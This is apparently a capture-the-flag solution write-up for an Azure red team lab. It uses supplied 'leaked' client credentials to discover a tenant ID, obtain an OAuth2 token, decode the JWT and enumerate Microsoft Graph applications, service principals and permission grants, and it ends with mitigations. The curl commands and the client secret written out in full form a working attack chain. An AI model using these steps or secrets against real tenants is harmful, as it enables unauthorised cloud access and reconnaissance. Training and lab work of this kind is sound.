# Azure App Registration Red Team Lab — Solution

# Overview

This walkthrough demonstrates how to enumerate an Azure App Registration using leaked credentials and extract the Microsoft Graph permission assigned to the application.

The objective is to:

- Discover the Tenant ID
- Authenticate using OAuth2 Client Credentials Flow
- Obtain a JWT access token
- Enumerate Microsoft Graph permissions
- Extract the hidden flag

---

# Attack Chain

```mermaid
flowchart TD

A[Leaked Credentials] --> B[Tenant Enumeration]

B --> C[OAuth2 Authentication]

C --> D[Access Token Retrieval]

D --> E[JWT Decoding]

E --> F[Microsoft Graph Enumeration]

F --> G[Permission Discovery]

G --> H[Flag]
```

---

# Provided Credentials

```text
Client ID     : caaa28c5-b8da-4d29-b42e-95b1aba6b81c
Client Secret : bXj8Q~_v1Y.hArjCqwQBUhCE-MwAvqB_Q1AcAa-V
Domain Name   : secure-corp.org
```

---

# Step 1 — Discover Tenant ID

Azure exposes OpenID configuration publicly.  
This endpoint provides authentication metadata for the tenant.

## Command

```bash
curl https://login.microsoftonline.com/secure-corp.org/v2.0/.well-known/openid-configuration
```

---

# Command Explanation

| Component | Explanation |
|---|---|
| `curl` | Command-line tool used to send HTTP requests |
| `https://login.microsoftonline.com/` | Microsoft authentication endpoint |
| `secure-corp.org` | Target domain name provided in the challenge |
| `/.well-known/openid-configuration` | Standard OpenID Connect discovery endpoint |
| `v2.0` | Azure OAuth2 v2 endpoint |

This request retrieves metadata such as:

- Token endpoint
- Authorization endpoint
- Tenant information
- Signing keys

---

# Tenant Discovery Flow

```mermaid
flowchart LR

A[Domain Name] --> B[OpenID Configuration Endpoint]

B --> C[Azure Response]

C --> D[Extract Tenant ID]
```

---

# Output

```json
{
  "token_endpoint":"https://login.microsoftonline.com/f2a33211-e46a-4c92-b84d-aff06c2cd13f/oauth2/v2.0/token"
}
```

## Extracted Tenant ID

```text
f2a33211-e46a-4c92-b84d-aff06c2cd13f
```

The Tenant ID is extracted from the `token_endpoint` URL.

---

# Step 2 — Obtain Access Token

Now authenticate using OAuth2 Client Credentials Flow.

This flow allows applications to authenticate without user interaction.

## Command

```bash
curl -X POST "https://login.microsoftonline.com/f2a33211-e46a-4c92-b84d-aff06c2cd13f/oauth2/v2.0/token" \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "client_id=caaa28c5-b8da-4d29-b42e-95b1aba6b81c" \
-d "client_secret=bXj8Q~_v1Y.hArjCqwQBUhCE-MwAvqB_Q1AcAa-V" \
-d "scope=https://graph.microsoft.com/.default" \
-d "grant_type=client_credentials"
```

---

# Command Explanation

| Component | Explanation |
|---|---|
| `curl` | Sends the HTTP request |
| `-X POST` | Specifies HTTP POST method |
| `/oauth2/v2.0/token` | Azure OAuth2 token endpoint |
| `-H "Content-Type: application/x-www-form-urlencoded"` | Defines request body format |
| `client_id` | Unique identifier of the Azure application |
| `client_secret` | Secret/password for the application |
| `scope=https://graph.microsoft.com/.default` | Requests Microsoft Graph permissions assigned to the application |
| `grant_type=client_credentials` | OAuth2 machine-to-machine authentication flow |

---

# OAuth2 Authentication Flow

```mermaid
sequenceDiagram

participant Attacker
participant AzureLogin as Microsoft Identity Platform
participant Graph as Microsoft Graph API

Attacker->>AzureLogin: Send client_id + client_secret
AzureLogin->>AzureLogin: Validate Credentials
AzureLogin-->>Attacker: Return JWT Access Token

Attacker->>Graph: Send Bearer Token
Graph-->>Attacker: Return Graph Resources
```

---

# Successful Response

```json
{
  "token_type":"Bearer",
  "access_token":"eyJ..."
}
```

The response contains a JWT access token used for Microsoft Graph authentication.

---

# Save the Token

## Command

```bash
export TOKEN="eyJ..."
```

---

# Command Explanation

| Component | Explanation |
|---|---|
| `export` | Creates an environment variable |
| `TOKEN` | Variable name storing the JWT token |
| `"eyJ..."` | Access token returned by Azure |

This allows easier reuse of the token in future commands.

---

# Step 3 — Decode JWT Token

JWT tokens contain information such as:

- Roles
- Permissions
- Tenant ID
- Application ID

## Command

```bash
echo $TOKEN | cut -d "." -f2 | base64 -d 2>/dev/null | jq
```

---

# Command Explanation

| Component | Explanation |
|---|---|
| `echo $TOKEN` | Prints the JWT token |
| `cut -d "." -f2` | Extracts the payload section of the JWT |
| `base64 -d` | Decodes Base64 encoded payload |
| `2>/dev/null` | Suppresses decoding errors |
| `jq` | Formats JSON output for readability |

JWT format:

```text
HEADER.PAYLOAD.SIGNATURE
```

The payload section contains application roles and permissions.

---

# JWT Structure

```mermaid
flowchart TD

A[JWT Token] --> B[Header]
A --> C[Payload]
A --> D[Signature]

C --> E[roles]
C --> F[appid]
C --> G[tenant_id]
C --> H[audience]
```

---

# Extracted JWT Payload

```json
"roles": [
  "Application.Read.All"
]
```

---

# Step 4 — Identify the Permission

The challenge description stated:

```text
The flag is the permission assigned to the application.
```

Inside the JWT payload, the assigned permission was:

```text
Application.Read.All
```

This is the hidden flag.

---

# Step 5 — Microsoft Graph Enumeration

Additional enumeration can be performed using Microsoft Graph API.

---

# Enumerate Applications

## Command

```bash
curl -H "Authorization: Bearer $TOKEN" \
https://graph.microsoft.com/v1.0/applications
```

---

# Command Explanation

| Component | Explanation |
|---|---|
| `Authorization: Bearer $TOKEN` | Sends JWT token for authentication |
| `/v1.0/applications` | Microsoft Graph endpoint for Azure applications |

This endpoint lists application registrations inside the tenant.

---

# Enumerate Service Principals

## Command

```bash
curl -H "Authorization: Bearer $TOKEN" \
https://graph.microsoft.com/v1.0/servicePrincipals
```

---

# Command Explanation

| Component | Explanation |
|---|---|
| `/servicePrincipals` | Lists service principals inside Azure |

This reveals enterprise applications and identities used by workloads.

---

# Enumerate OAuth Permission Grants

## Command

```bash
curl -H "Authorization: Bearer $TOKEN" \
https://graph.microsoft.com/v1.0/oauth2PermissionGrants
```

---

# Command Explanation

| Component | Explanation |
|---|---|
| `/oauth2PermissionGrants` | Lists delegated OAuth permissions granted inside the tenant |

This helps identify excessive Graph permissions.

---

# Microsoft Graph Enumeration Flow

```mermaid
flowchart TD

A[JWT Access Token] --> B[Microsoft Graph API]

B --> C[Applications]

B --> D[Service Principals]

B --> E[OAuth Permission Grants]

E --> F[Permission Discovery]
```

---

# Flag

```text
Application.Read.All
```

---

# What Does Application.Read.All Mean?

This Microsoft Graph permission allows:

- Reading all application registrations
- Enumerating enterprise applications
- Viewing service principals
- Performing tenant reconnaissance

---

# Real-World Attack Scenario

```mermaid
flowchart TD

A[Exposed GitHub Secret] --> B[Attacker Obtains Azure Credentials]

B --> C[OAuth Authentication]

C --> D[Microsoft Graph Enumeration]

D --> E[Permission Discovery]

E --> F[Privilege Escalation]

F --> G[Cloud Compromise]
```

---

# Security Risks

## Exposed Credentials

Possible exposure sources:

- GitHub repositories
- CI/CD pipelines
- Hardcoded secrets
- Public configuration files

---

## Excessive Permissions

The application possessed:

```text
Application.Read.All
```

This enables broad tenant reconnaissance.

---

# Mitigations

## Rotate Secrets Frequently

Use:

- Azure Key Vault
- Managed Identities
- Secret expiration policies

---

## Apply Least Privilege

Avoid assigning excessive Graph permissions unless required.

---

## Monitor Service Principals

Enable:

- Sign-in logging
- Conditional access
- Identity monitoring

---

# Final Flag

```text
Application.Read.All
```